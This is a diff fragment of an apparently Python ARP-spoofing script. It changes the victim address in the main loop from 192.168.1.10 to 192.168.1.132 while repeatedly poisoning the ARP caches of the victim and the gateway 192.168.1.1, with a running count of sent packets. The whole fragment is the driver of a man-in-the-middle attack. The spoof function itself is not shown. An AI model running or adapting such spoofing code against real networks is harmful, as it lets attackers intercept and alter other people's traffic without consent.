@@ -35,8 +35,8 @@ def restore(destination_ip, source_ip):
 send_packets_count = 0
 try: # handling the error of control c
     while True:
-        spoof("192.168.1.10", "192.168.1.1")
-        spoof("192.168.1.1","192.168.1.10")
+        spoof("192.168.1.132", "192.168.1.1")
+        spoof("192.168.1.1","192.168.1.132")
         send_packets_count = send_packets_count + 2
         print("\r[+] Sent packets " + str(send_packets_count), end="")
         time.sleep(2)
